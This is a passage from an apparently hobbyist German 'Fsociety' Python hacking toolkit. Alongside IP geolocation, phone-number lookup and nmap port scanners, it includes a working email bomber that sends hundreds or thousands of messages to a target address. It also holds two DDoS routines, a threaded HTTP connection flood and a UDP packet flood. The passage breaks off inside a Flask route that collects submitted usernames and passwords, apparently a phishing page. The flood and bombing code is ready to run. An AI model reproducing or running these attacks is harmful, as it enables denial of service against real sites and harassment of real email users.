Alles was ihr macht ist auf eure eigene Gefahr!!!
                    Viel Spaß!""")
    input("\nDrücke Enter um fortzufahren...")


def website_scanner_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(bcolors.Green + "=" * 80)
        print(bcolors.YELLOW + " " * 30 + "WEBSITE SCANNER")
        print(bcolors.Green + "=" * 80)
        print("\n1. Website scannen")
        print("2. Offene Ports finden")
        print("3. Zurück zum Hauptmenü")
        print("=" * 80)

        sub_choice = input(bcolors.RED + "\nWählen Sie eine Option: ")

        if sub_choice == "1":
            scan_website()
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif sub_choice == "2":
            port_scanner()
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif sub_choice == "3":
            break
        else:
            print("\nUngültige Auswahl!")
            input("\nDrücken Sie Enter, um fortzufahren...")


def ip_map_finder():
    import webbrowser
    import requests

    def get_location_from_ip(ip_address):
        try:
            if ip_address.lower() == 'me':
                response = requests.get('https://ipinfo.io/json')
            else:
                response = requests.get(f'https://ipinfo.io/{ip_address}/json')

            if response.status_code == 200:
                data = response.json()
                if 'loc' in data:
                    lat, lng = map(float, data['loc'].split(','))
                    return lat, lng, data
            return None, None, None
        except Exception as e:
            print(f"Error getting location: {e}")
            return None, None, None

    def show_ip_info(ip_address):
        print(f"\n{bcolors.BLUE}" + "=" * 50)
        print(f"IP Information for {ip_address}")
        print("=" * 50 + f"{bcolors.ENDC}")

        lat, lng, data = get_location_from_ip(ip_address)

        if data:
            print(f"{bcolors.BLUE}IP Address: {data.get('ip', 'N/A')}")
            print(f"Hostname: {data.get('hostname', 'N/A')}")
            print(f"City: {data.get('city', 'N/A')}")
            print(f"Region: {data.get('region', 'N/A')}")
            print(f"Country: {data.get('country', 'N/A')}")
            print(f"Location: {data.get('loc', 'N/A')}")
            print(f"Organization: {data.get('org', 'N/A')}")
            print(f"Postal: {data.get('postal', 'N/A')}")
            print("=" * 50 + f"\n{bcolors.ENDC}")

            if lat and lng:
                open_map = input("Möchten Sie den Standort in Google Maps öffnen? (j/n): ").strip().lower()
                if open_map == 'j':
                    url = f"https://www.google.com/maps?q={lat},{lng}"
                    webbrowser.open(url)
        else:
            print("Konnte keine Informationen für die angegebene IP-Adresse abrufen.")

    while True:
        print(f"\n{bcolors.BLUE}" + "=" * 50)
        print(f"IP-Map-Finder")
        print("=" * 50)
        print(f"1. Eigene IP-Adresse anzeigen")
        print(f"2. Bestimmte IP-Adresse überprüfen")
        print(f"3. Zurück zum Hauptmenü")
        print("=" * 50)
        print(f"\n{bcolors.ENDC}", end="")

        choice = input(f"{bcolors.BLUE}Wählen Sie eine Option: {bcolors.ENDC}").strip()

        if choice == '1':
            show_ip_info('me')
        elif choice == '2':
            ip = input(f"{bcolors.BLUE}\nGeben Sie die IP-Adresse ein: {bcolors.ENDC}").strip()
            if ip:
                show_ip_info(ip)
            else:
                print(f"{bcolors.BLUE}Ungültige Eingabe. Bitte versuchen Sie es erneut.{bcolors.ENDC}")
        elif choice == '3':
            break
        else:
            print(f"{bcolors.BLUE}Ungültige Auswahl. Bitte versuchen Sie es erneut.{bcolors.ENDC}")


def ip_tracker_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{bcolors.BLUE}" + "=" * 80)
        print(f"{' ' * 30}IP TRACKER")
        print("=" * 80 + f"{bcolors.ENDC}")
        print(f"\n{bcolors.BLUE}1. IP-Adresse tracken")
        print("2. Eigene IP-Informationen anzeigen")
        print("3. Zurück zum Hauptmenü")
        print("\n" + "=" * 80 + f"{bcolors.ENDC}")

        sub_choice = input(bcolors.RED + "\nWählen Sie eine Option: ")

        if sub_choice == "1":
            ip = input("Geben Sie die IP-Adresse ein: ")
            result = get_ipinfo_data(ip)
            display_result(result)
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif sub_choice == "2":
            result = get_ipinfo_data("")
            display_result(result)
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif sub_choice == "3":
            break
        else:
            print("\nUngültige Auswahl!")
            input("\nDrücken Sie Enter, um fortzufahren...")


class bcolors:
    Green = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    DARK_BLUE = "\033[34m"
    ENDC = "\033[0m"  # Reset to default color


def banner():
    print(bcolors.BLUE + """

 ______              _      _                    _______          _ 
|  ____|            (_)    | |                  |__   __|        | |
| |__ ___  ___   ___ _  ___| |_ _   _   ______     | | ___   ___ | |
|  __/ __|/ _ \ / __| |/ _ \ __| | | | |______|    | |/ _ \ / _ \| |
| |  \__ \ (_) | (__| |  __/ |_| |_| |             | | (_) | (_) | |
|_|  |___/\___/ \___|_|\___|\__|\__, |             |_|\___/ \___/|_|
                                 __/ |                              
                                |___/                               

    """)


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + "\n+[+[+[-Initializing program-]+]+]+")
            self.target = str(input(bcolors.Green + "Enter target email  <: "))
            self.mode = int(input(
                bcolors.Green + "Enter BOMB mode (1,2,3,4) // 1:(1000) // 2:(500) // 3:(250) // 4:(custom)  <:  "))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERROR: Invalid Option. GoodBye. ")
                sys.exit(1)
        except Exception as E:
            print(f"ERROR: {E}")

    def bomb(self):
        try:
            print(bcolors.RED + "\n+[+[+[-Setting up bomb-]+]+]+")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            elif self.mode == int(4):
                self.amount = int(input(bcolors.Green + "Choose a CUSTOM amount <: "))
            print(bcolors.RED + f"\n+[+[+[-You have selected BOMB mode: {self.mode} and {self.amount} emails-]+]+]+")
        except Exception as E:
            print(f"ERROR: {E}")

    def email(self):
        try:
            print(bcolors.RED + "\n+[+[+[-Setting up email-]+]+]+")
            self.server = str(input(
                bcolors.Green + "Enter email server / or select premade options - 1:Gmail, 2:Yahoo, 3:Outlook <: "))
            premade = ["1", "2", "3"]
            default_port = True
            if self.server in premade:
                default_port = True
                if self.server == "1":
                    self.server = "smtp.gmail.com"
                elif self.server == "2":
                    self.server = "smtp.mail.yahoo.com"
                elif self.server == "3":
                    self.server = "smtp-mail.outlook.com"
                self.port = 587
            else:
                default_port = False
                self.port = int(input(bcolors.Green + "Enter port number <: "))

            self.fromAddr = str(input(bcolors.Green + "Enter from address <: "))
            self.fromPwd = str(input(bcolors.Green + "Enter from password <: "))
            self.subject = str(input(bcolors.Green + "Enter subject <: "))
            self.message = str(input(bcolors.Green + "Enter message <: "))

            self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as E:
            print(f"ERROR: {E}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f"BOMB: {self.count}")
        except Exception as E:
            print(f"ERROR: {E}")

    def attack(self):
        print(bcolors.RED + "\n+[+[+[ Attacking...]+]+]+")
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + "\n+[+[+[-Attack finished-]+]+]+")
        sys.exit(0)


def show_banner():
    print(bcolors.RED + """
                           ______              _      _                    _______          _ 
                          |  ____|            (_)    | |                  |__   __|        | |
                          | |__ ___  ___   ___ _  ___| |_ _   _   ______     | | ___   ___ | |
                          |  __/ __|/ _ \ / __| |/ _ \ __| | | | |______|    | |/ _ \ / _ \| |
                          | |  \__ \ (_) | (__| |  __/ |_| |_| |             | | (_) | (_) | |
                          |_|  |___/\___/ \___|_|\___|\__|\__, |             |_|\___/ \___/|_|
                                                           __/ |                              
                                                          |___/                               
""")


# Erweiterte Datenbank mit Ländervorwahlen und Hauptstädten
COUNTRY_CODES = {
    # Europa
    '49': {'name': 'Deutschland', 'capital': 'Berlin', 'lat': 52.52, 'lng': 13.405},
    '43': {'name': 'Österreich', 'capital': 'Wien', 'lat': 48.2082, 'lng': 16.3738},
    '41': {'name': 'Schweiz', 'capital': 'Bern', 'lat': 46.9480, 'lng': 7.4474},
    '33': {'name': 'Frankreich', 'capital': 'Paris', 'lat': 48.8566, 'lng': 2.3522},
    '39': {'name': 'Italien', 'capital': 'Rom', 'lat': 41.9028, 'lng': 12.4964},
    '44': {'name': 'Vereinigtes Königreich', 'capital': 'London', 'lat': 51.5074, 'lng': -0.1278},
    '34': {'name': 'Spanien', 'capital': 'Madrid', 'lat': 40.4168, 'lng': -3.7038},
    '31': {'name': 'Niederlande', 'capital': 'Amsterdam', 'lat': 52.3676, 'lng': 4.9041},
    '32': {'name': 'Belgien', 'capital': 'Brüssel', 'lat': 50.8503, 'lng': 4.3517},
    '46': {'name': 'Schweden', 'capital': 'Stockholm', 'lat': 59.3293, 'lng': 18.0686},
    '47': {'name': 'Norwegen', 'capital': 'Oslo', 'lat': 59.9139, 'lng': 10.7522},
    '45': {'name': 'Dänemark', 'capital': 'Kopenhagen', 'lat': 55.6761, 'lng': 12.5683},
    '358': {'name': 'Finnland', 'capital': 'Helsinki', 'lat': 60.1699, 'lng': 24.9384},
    '7': {'name': 'Russland', 'capital': 'Moskau', 'lat': 55.7558, 'lng': 37.6173},
    '48': {'name': 'Polen', 'capital': 'Warschau', 'lat': 52.2297, 'lng': 21.0122},
    '420': {'name': 'Tschechien', 'capital': 'Prag', 'lat': 50.0755, 'lng': 14.4378},
    '36': {'name': 'Ungarn', 'capital': 'Budapest', 'lat': 47.4979, 'lng': 19.0402},
    '30': {'name': 'Griechenland', 'capital': 'Athen', 'lat': 37.9838, 'lng': 23.7275},
    '90': {'name': 'Türkei', 'capital': 'Ankara', 'lat': 39.9334, 'lng': 32.8597},
    
    # Nordamerika
    '1': {'name': 'USA/Kanada', 'capital': 'Washington D.C.', 'lat': 38.9072, 'lng': -77.0369},
    '52': {'name': 'Mexiko', 'capital': 'Mexiko-Stadt', 'lat': 19.4326, 'lng': -99.1332},
    
    # Südamerika
    '55': {'name': 'Brasilien', 'capital': 'Brasília', 'lat': -15.8267, 'lng': -47.9218},
    '54': {'name': 'Argentinien', 'capital': 'Buenos Aires', 'lat': -34.6037, 'lng': -58.3816},
    '51': {'name': 'Peru', 'capital': 'Lima', 'lat': -12.0464, 'lng': -77.0428},
    
    # Asien
    '86': {'name': 'China', 'capital': 'Peking', 'lat': 39.9042, 'lng': 116.4074},
    '81': {'name': 'Japan', 'capital': 'Tokio', 'lat': 35.6762, 'lng': 139.6503},
    '82': {'name': 'Südkorea', 'capital': 'Seoul', 'lat': 37.5665, 'lng': 126.9780},
    '91': {'name': 'Indien', 'capital': 'Neu-Delhi', 'lat': 28.6139, 'lng': 77.2090},
    '60': {'name': 'Malaysia', 'capital': 'Kuala Lumpur', 'lat': 3.1390, 'lng': 101.6869},
    '63': {'name': 'Philippinen', 'capital': 'Manila', 'lat': 14.5995, 'lng': 120.9842},
    '66': {'name': 'Thailand', 'capital': 'Bangkok', 'lat': 13.7563, 'lng': 100.5018},
    '84': {'name': 'Vietnam', 'capital': 'Hanoi', 'lat': 21.0278, 'lng': 105.8342},
    '65': {'name': 'Singapur', 'capital': 'Singapur', 'lat': 1.3521, 'lng': 103.8198},
    '60': {'name': 'Malaysia', 'capital': 'Kuala Lumpur', 'lat': 3.1390, 'lng': 101.6869},
    '971': {'name': 'VAE', 'capital': 'Abu Dhabi', 'lat': 24.4539, 'lng': 54.3773},
    '972': {'name': 'Israel', 'capital': 'Jerusalem', 'lat': 31.7683, 'lng': 35.2137},
    '90': {'name': 'Türkei', 'capital': 'Ankara', 'lat': 39.9334, 'lng': 32.8597},
    
    # Ozeanien
    '61': {'name': 'Australien', 'capital': 'Canberra', 'lat': -35.2809, 'lng': 149.1300},
    '64': {'name': 'Neuseeland', 'capital': 'Wellington', 'lat': -41.2865, 'lng': 174.7762},
    
    # Afrika
    '27': {'name': 'Südafrika', 'capital': 'Pretoria', 'lat': -25.7479, 'lng': 28.2293},
    '20': {'name': 'Ägypten', 'capital': 'Kairo', 'lat': 30.0444, 'lng': 31.2357},
    '212': {'name': 'Marokko', 'capital': 'Rabat', 'lat': 34.0209, 'lng': -6.8416},
    '234': {'name': 'Nigeria', 'capital': 'Abuja', 'lat': 9.0820, 'lng': 7.4694},
    '254': {'name': 'Kenia', 'capital': 'Nairobi', 'lat': -1.2864, 'lng': 36.8172}
}

# Deutsche Vorwahlen mit ungefähren Koordinaten (Hauptstädte der Bundesländer)
GERMAN_AREA_CODES = {
    '30': {'city': 'Berlin', 'lat': 52.52, 'lng': 13.405},
    '40': {'city': 'Hamburg', 'lat': 53.5511, 'lng': 9.9937},
    '69': {'city': 'Frankfurt am Main', 'lat': 50.1109, 'lng': 8.6821},
    '89': {'city': 'München', 'lat': 48.1351, 'lng': 11.5820},
    '211': {'city': 'Düsseldorf', 'lat': 51.2277, 'lng': 6.7735},
    '221': {'city': 'Köln', 'lat': 50.9375, 'lng': 6.9603},
    '201': {'city': 'Essen', 'lat': 51.4556, 'lng': 7.0116},
    '351': {'city': 'Dresden', 'lat': 51.0504, 'lng': 13.7373},
    '345': {'city': 'Halle (Saale)', 'lat': 51.4816, 'lng': 11.9799},
}

def get_phone_info(phone_number):
    try:
        # Standardmäßig +49 (Deutschland) als Ländercode, falls nicht angegeben
        if not phone_number.startswith('+'):
            phone_number = '+49' + phone_number.lstrip('0')
        
        # Telefonnummer parsen
        parsed_number = phonenumbers.parse(phone_number)
        
        # Überprüfen, ob die Nummer gültig ist
        if not phonenumbers.is_valid_number(parsed_number):
            return None, "Ungültige Telefonnummer"
        
        # Formatierte Nummer
        formatted_number = phonenumbers.format_number(
            parsed_number, 
            phonenumbers.PhoneNumberFormat.INTERNATIONAL
        )
        
        # Ländercode und Vorwahl extrahieren
        country_code = str(parsed_number.country_code)
        national_number = str(parsed_number.national_number)
        
        # Standortinformationen basierend auf Ländercode
        location_info = {
            'country': COUNTRY_CODES.get(country_code, {}).get('name', 'Unbekannt'),
            'lat': COUNTRY_CODES.get(country_code, {}).get('lat', 0),
            'lng': COUNTRY_CODES.get(country_code, {}).get('lng', 0),
            'city': 'Unbekannt',
            'accuracy': 'Land'
        }
        
        # Wenn es sich um eine deutsche Nummer handelt, versuche die Stadt zu bestimmen
        if country_code == '49' and len(national_number) >= 3:
            # Versuche, die Vorwahl zu extrahieren (ersten 2-5 Ziffern)
            for length in range(5, 1, -1):
                if len(national_number) >= length:
                    area_code = national_number[:length]
                    if area_code in GERMAN_AREA_CODES:
                        location_info.update({
                            'city': GERMAN_AREA_CODES[area_code]['city'],
                            'lat': GERMAN_AREA_CODES[area_code]['lat'],
                            'lng': GERMAN_AREA_CODES[area_code]['lng'],
                            'accuracy': 'Stadt'
                        })
                        break
        
        return {
            'number': formatted_number,
            'country_code': country_code,
            'national_number': national_number,
            'is_valid': True,
            'number_type': phonenumbers.number_type(parsed_number),
            'location': location_info
        }, None
        
    except Exception as e:
        return None, f"Fehler bei der Verarbeitung: {str(e)}"

def show_phone_info():
    print("\n" + "="*70)
    print("Number-Finder (INTERNATIONAL)".center(70))
    print("="*70)
    
    phone_number = input("Geben Sie eine Telefonnummer ein (mit oder ohne Ländervorwahl): ").strip()
    
    if not phone_number:
        print("Keine Telefonnummer eingegeben.")
        return
        
    info, error = get_phone_info(phone_number)
    
    if error:
        print(f"\nFehler: {error}")
        return
        
    print("\n" + "="*70)
    print(f"INFORMATIONEN FÜR: {info['number']}".center(70))
    print("="*70)
    
    # Länderspezifische Informationen anzeigen
    country_info = COUNTRY_CODES.get(info['country_code'], {})
    
    print(f"\n{'Ländervorwahl:':<20} +{info['country_code']}")
    print(f"{'Land:':<20} {country_info.get('name', 'Unbekannt')}")
    if 'capital' in country_info:
        print(f"{'Hauptstadt:':<20} {country_info['capital']}")
    
    print(f"\n{'Nationale Nummer:':<20} {info['national_number']}")
    print(f"{'Gültige Nummer:':<20} {'Ja' if info['is_valid'] else 'Nein'}")
    
    # Nummerntyp bestimmen
    number_type = info['number_type']
    type_str = "Unbekannt"
    if number_type == phonenumbers.PhoneNumberType.MOBILE:
        type_str = "📱 Mobilfunknummer"
    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
        type_str = "📞 Festnetznummer"
    elif number_type == phonenumbers.PhoneNumberType.TOLL_FREE:
        type_str = "🆓 Gebührenfrei"
    elif number_type == phonenumbers.PhoneNumberType.PREMIUM_RATE:
        type_str = "💎 Mehrwertdienst"
    
    print(f"\n{'Nummerntyp:':<20} {type_str}")
    
    # Standortinformationen anzeigen
    loc = info.get('location', {})
    if loc and 'lat' in loc and 'lng' in loc and loc['lat'] and loc['lng']:
        print("\n" + "UNTERSTÜTZTE LÄNDER".center(70, '-'))
        print("Hinweis: Die Standortinformationen basieren auf der Ländervorwahl")
        print("und zeigen die Hauptstadt oder eine größere Stadt im jeweiligen Land an.")
        print("-" * 70)
        
        print(f"\n{'Ungefährer Standort:':<20}")
        print(f"{'Land:':<20} {loc.get('country', 'Unbekannt')}")
        if 'city' in loc and loc['city'] != 'Unbekannt':
            print(f"{'Stadt:':<20} {loc['city']}")
        elif 'capital' in country_info:
            print(f"{'Hauptstadt:':<20} {country_info['capital']}")
            
        print(f"\n{'Koordinaten:':<20} {loc.get('lat', 'N/A')}, {loc.get('lng', 'N/A')}")
        
        # Google Maps Link anbieten
        maps_url = f"https://www.google.com/maps?q={loc['lat']},{loc['lng']}"
        print(f"\n{'Google Maps Link:':<20} {maps_url}")
        
        # Frage, ob der Benutzer die Karte öffnen möchte
        open_map = input("\nMöchten Sie den Standort in Google Maps öffnen? (j/n): ").strip().lower()
        if open_map in ['j', 'ja', 'y', 'yes']:
            try:
                webbrowser.open(maps_url)
                print("Google Maps wird geöffnet...")
            except Exception as e:
                print(f"Fehler beim Öffnen von Google Maps: {e}")
    
    print("\n" + "="*70)
    print("Hinweis: Die Standortbestimmung basiert auf der Ländervorwahl")
    print("und zeigt nicht den tatsächlichen Standort des Anschlusses an.")
    print("="*70 + "\n")

def phone_number_analyzer():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print("\n" + "="*70)
        print("TELEFONNUMMERN-ANALYSE (INTERNATIONAL)".center(70))
        print("="*70)
        print("1. Telefonnummer überprüfen")
        print("2. Unterstützte Länder anzeigen")
        print("3. Zurück zum Hauptmenü")
        print("="*70)
        
        try:
            choice = input("\nWählen Sie eine Option: ").strip()
            
            if choice == '1':
                show_phone_info()
                input("\nDrücken Sie Enter, um fortzufahren...")
            elif choice == '2':
                print("\n" + "UNTERSTÜTZTE LÄNDER".center(70, '-'))
                print("Ländervorwahl | Land".center(70))
                print("-" * 70)
                
                # Sortiere Länder nach Name
                sorted_countries = sorted(COUNTRY_CODES.items(), key=lambda x: x[1]['name'])
                
                # Zeige Länder in zwei Spalten an
                for i in range(0, len(sorted_countries), 2):
                    code1, data1 = sorted_countries[i]
                    line = f"+{code1:<12} {data1['name']}"
                    
                    # Zweite Spalte, falls vorhanden
                    if i + 1 < len(sorted_countries):
                        code2, data2 = sorted_countries[i + 1]
                        line += f" | +{code2:<12} {data2['name']}"
                    
                    print(line)
                
                print("\nHinweis: Weitere Länder können hinzugefügt werden.")
                input("\nDrücken Sie Enter, um fortzufahren...")
                
            elif choice == '3':
                break
            else:
                print("\nUngültige Auswahl. Bitte versuchen Sie es erneut.")
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nZurück zum Hauptmenü...")
            time.sleep(1)
            break
        except Exception as e:
            print(f"\nEin Fehler ist aufgetreten: {e}")
            time.sleep(2)


def scan_website():
    print("\n=== Website Scanner ===")

    def check_status(url):
        if not url.startswith(('http://', 'https://')):
            url = f"https://{url}"
        try:
            response = requests.get(url, timeout=5)
            print(f"\nURL: {url}")
            print(f"Status Code: {response.status_code}")
            print(f"Server: {response.headers.get('Server', 'Nicht verfügbar')}")
            print(f"Content-Type: {response.headers.get('Content-Type', 'Nicht verfügbar')}")

            if response.status_code == 200:
                print("Status: Erfolgreich (200 OK)")
            else:
                print("Status: Fehler oder Weiterleitung")

        except requests.exceptions.RequestException as E:
            print(f"\nFehler: {str(E)}")

    target = input("Geben Sie die Website-URL ein (z.B. example.com): ")
    check_status(target)
    input("\nDrücke Enter um fortzufahren...")


def ip_scanner():
    print("\n=== IP Scanner ===")

    # Überprüfe ob nmap installiert ist
    if not is_nmap_installed():
        print("\n" + "!" * 50)
        print("Nmap ist nicht installiert oder nicht im Systempfad.")
        print("Bitte installieren Sie Nmap für die Verwendung des IP-Scanners:")
        print("1. Besuchen Sie https://nmap.org/download.html")
        print("2. Laden Sie die Windows-Installer-Version herunter")
        print("3. Führen Sie das Installationsprogramm aus")
        print("4. Stellen Sie sicher, dass Sie die Option 'Add Nmap to PATH' auswählen")
        print("5. Starten Sie das Programm nach der Installation neu")
        print("!" * 50 + "\n")
        input("Drücken Sie Enter, um zum Hauptmenü zurückzukehren...")
        return

    target = input("\nGeben Sie die IP-Adresse oder den IP-Bereich ein (z.B. 192.168.1.1 oder 192.168.1.0/24): ")

    try:
        print(f"\nStarte Scan von {target}...")
        print("Dies kann einige Sekunden bis Minuten dauern, bitte haben Sie Geduld...")

        nm = nmap.PortScanner()

        # Schneller Scan der häufigsten Ports mit Timeout
        nm.scan(hosts=target, arguments='-F -T4 --host-timeout 5m')

        print("\n" + "=" * 50)
        print(f"Scan abgeschlossen!")
        print(f"Ziel: {target}")
        print("=" * 50)

        all_hosts = nm.all_hosts()
        if not all_hosts:
            print("Keine Hosts gefunden oder erreichbar.")
            return

        for host in all_hosts:
            print(f"\nHost: {host} ({nm[host].hostname() or 'Kein Hostname'})")
            print(f"Status: {nm[host].state()}")

            if 'tcp' in nm[host]:
                print("\nOffene Ports:")
                print("PORT\tSTATE\tSERVICE\t	VERSION")
                for port in sorted(nm[host]['tcp'].keys()):
                    port_info = nm[host]['tcp'][port]
                    service = port_info.get('name', 'unknown')
                    version = port_info.get('version', '')
                    print(f"{port}/tcp\t{port_info['state']}\t{service}\t{version}")

    except KeyboardInterrupt:
        print("\nScan wurde abgebrochen.")
    except nmap.PortScannerError as E:
        print(f"\nFehler beim Scannen: {str(E)}")
        print("Mögliche Ursachen:")
        print("- Ungültige IP-Adresse oder Netzwerkbereich")
        print("- Keine Netzwerkverbindung")
        print("- Fehlende Administratorrechte (erforderlich für bestimmte Scan-Typen)")
    except Exception as E:
        print(f"\nUnerwarteter Fehler: {str(E)}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def port_scanner():
    print("\n=== Port Scanner ===")

    target = input("Geben Sie die Ziel-IP oder Domain ein: ")

    # Liste der häufigsten Ports
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
        443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080
    ]

    print(f"\nScanne {target} auf offene Ports...")
    print("Dies kann einige Minuten dauern...\n")

    try:
        nm = nmap.PortScanner()

        # Schneller Scan der häufigsten Ports
        nm.scan(hosts=target, arguments='-p ' + ','.join(map(str, common_ports)) + ' -T4')

        print("\n" + "=" * 50)
        print(f"Scanergebnis für {target}:")
        print("=" * 50)

        for host in nm.all_hosts():
            print(f"\nHost: {host} ({nm[host].hostname() or 'Kein Hostname gefunden'})")
            print(f"Status: {nm[host].state()}")

            if 'tcp' in nm[host]:
                print("\nOffene Ports:")
                print("PORT\tSTATE\tSERVICE")
                for port in sorted(nm[host]['tcp'].keys()):
                    port_info = nm[host]['tcp'][port]
                    service = port_info.get('name', 'unbekannt')
                    print(f"{port}/tcp\t{port_info['state']}\t{service}")

        print("\nScan abgeschlossen!")

    except Exception as E:
        print(f"\nFehler beim Scannen: {str(E)}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def is_nmap_installed():
    """Überprüft, ob Nmap installiert und im Systempfad ist"""
    try:
        import subprocess
        # Versuche nmap-Version abzurufen
        result = subprocess.run(['nmap', '--version'],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True)
        return result.returncode == 0
    except (FileNotFoundError, OSError):
        return False


def main():
    # Passwortabfrage
    if input(bcolors.RED + "Bitte schreiben Sie 'fsociety' zum Starten: ").lower() != 'fsociety':
        print("Ungültiges Passwort!")
        return

    while True:
        choice = show_menu()  # Show the menu and get user choice

        if choice == "98":
            show_info()
        elif choice == "1":
            password_cracker()
        elif choice == "2":
            website_scanner_menu()
        elif choice == "3":
            ip_scanner()
        elif choice == "4":
            banner()
            bomb = Email_Bomber()
            bomb.bomb()
            bomb.email()
            bomb.attack()
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif choice == "5":
            port_scanner()
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif choice == "6":
            start_web_server()
            input("\nDrücken Sie Enter, um fortzufahren...")
        elif choice == "7":
            ip_tracker_menu()
        elif choice == "8":
            password_cracker()
        elif choice == "9":
            ip_scanner()
        elif choice == "10":
            discord_token_block_friends()
        elif choice == "11":
            target = input("Ziel-URL oder IP eingeben (z.B. example.com): ")
            port = 80  # Default HTTP port
            fake_ip = '192.168.0.1'  # Fake IP to hide real IP

            print(
                "\n" + bcolors.RED + "WARNUNG: DDOS-Angriffe sind illegal und können zu strafrechtlichen Konsequenzen führen!")
            confirm = input("Möchten Sie wirklich fortfahren? (ja/nein): ")

            if confirm.lower() != 'ja':
                print("Vorgang abgebrochen.")
                input("\nDrücken Sie Enter, um fortzufahren...")
                continue

            already_connected = 0

            def attack():
                nonlocal already_connected
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target, port))
                        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                        s.close()

                        already_connected += 1
                        if already_connected % 10 == 0:  # Only print every 10 requests to reduce output
                            print(f"Anfragen gesendet: {already_connected}")
                    except Exception as E:
                        print(f"Fehler: {E}")
                        break

            # Start multiple threads for the attack
            print("\nStarte DDOS-Angriff (Drücken Sie Strg+C zum Beenden)...")
            try:
                for i in range(100):  # Reduced number of threads to be more reasonable
                    thread = threading.Thread(target=attack)
                    thread.daemon = True
                    thread.start()

                # Keep the main thread alive
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nAngriff gestoppt.")
                input("\nDrücken Sie Enter, um fortzufahren...")

        elif choice == "9":
            banner()
            print(
                bcolors.RED + "\nWARNUNG: DDOS-Angriffe sind illegal und können zu strafrechtlichen Konsequenzen führen!")
            confirm = input("Möchten Sie wirklich fortfahren? (ja/nein): ")

            if confirm.lower() != 'ja':
                print("Vorgang abgebrochen.")
                input("\nDrücken Sie Enter, um fortzufahren...")
                continue

            try:
                ip = input("\nIP Target : ")
                port = int(input("Port      : "))

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)
                sent = 0

                print("\n" + bcolors.RED + "Angriff gestartet! Drücken Sie Strg+C zum Beenden...")

                while True:
                    sock.sendto(bytes, (ip, port))
                    sent = sent + 1
                    port = port + 1
                    print(f"{bcolors.YELLOW}Gesendete Pakete an {ip} über Port: {port}")
                    if port == 65534:
                        port = 1

            except KeyboardInterrupt:
                print("\nAngriff gestoppt.")
            except Exception as e:
                print(f"\nFehler: {str(e)}")

            input("\nDrücken Sie Enter, um fortzufahren...")

        elif choice == "99":
            print("\nAuf Wiedersehen!")
            break
        else:
            print("\nUngültige Auswahl! Bitte wählen Sie eine gültige Option.")
            input("\nDrücken Sie Enter, um fortzufahren...")
            time.sleep(1)


def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80


def wrap_banner_lines(banner, width):
    wrapped = []
    for line in banner.splitlines():
        if len(line) <= width:
            wrapped.append(line)
        else:
            for i in range(0, len(line), width):
                wrapped.append(line[i:i + width])
    return '\n'.join(wrapped)


def center_text(text, width):
    return '\n'.join(line.center(width) for line in text.splitlines())


def get_ipinfo_data(ip):
    try:
        print("\nDelving through the vast internet stratosphere to locate the IP...")
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        response.raise_for_status()
        data = response.json()
        return {
            "IP": data.get("ip"),
            "City": data.get("city"),
            "Region or State": data.get("region"),
            "Country": data.get("country"),
            "Coordinates": data.get("loc"),
            "ISP (Internet Service Provider)": data.get("org"),
            "Timezone": data.get("timezone")
        }
    except Exception as E:
        return {"error": f"Failed to get data from ipinfo.io: {str(E)}"}


def display_result(result):
    if 'error' in result:
        print(f"\n{Fore.RED}[ERROR]{Style.RESET_ALL} {result['error']}")
    else:
        print()
        for key, value in result.items():
            print(f"{Fore.RED}{key}:{Style.RESET_ALL} {value}")


def ip_geolocation():
    width = get_terminal_width()
    ascii_banner = bcolors.YELLOW + """

  _____ _____    _______             _             
 |_   _|  __ \  |__   __|           | |            
   | | | |__) |    | |_ __ __ _  ___| | _____ _ __ 
   | | |  ___/     | | '__/ _` |/ __| |/ / _ \ '__|
  _| |_| |         | | | | (_| | (__|   <  __/ |   
 |_____|_|         |_|_|  \__,_|\___|_|\_\___|_|   



    """

    red_banner = Fore.RED + center_text(wrap_banner_lines(ascii_banner, width), width)
    credit = Fore.RED + center_text("Created by Fsociety", width)

    print(red_banner)
    print(credit + "\n")

    ip = input("Enter IP address to geo-locate: ").strip()
    result = get_ipinfo_data(ip)
    display_result(result)
    input("\nPress Enter to continue...")


def start_web_server():
    from flask import Flask, request, render_template
    import threading
    import webbrowser

    app = Flask(__name__)

    @app.route('/')
    def home():
        return render_template('index.html')

    @app.route('/submit', methods=['POST'])
    def submit():
        username = request.form['username']
        password = request.form['password']
